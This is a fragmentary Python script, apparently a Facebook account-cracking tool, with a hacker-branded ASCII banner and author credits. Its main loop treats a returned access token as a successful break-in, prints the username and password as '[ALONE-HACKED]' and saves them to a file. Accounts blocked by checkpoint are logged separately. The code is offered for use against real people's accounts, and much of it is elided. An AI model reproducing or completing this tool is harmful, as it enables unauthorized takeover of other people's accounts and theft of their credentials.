#Tools Created By JHALLA Hacker
#Toxic Snigdho
#The Decoder Of PAK
...
\033[0;94m          __    __    _____  _  _  ____ 
\033[0;94m        /__\  (  )  (  _  )( \( )( ___)
\033[0;96m       /(__)\  )(__  )(_)(  )  (  )__) 
\033[0;96m     (__)(__)(____)(_____)(_)\_)(____)
\033[0;96m  
""")

print("\033[0;91mThis Tool's Free By ALONE TOPPER")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : ALONE TOPPER'
    print '\033[0;94mFACEBOOK : JHALLA BRAND'
    print '\033[0;96mGITHUB   : JHALLA11'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[ALONE-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[ALONE-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
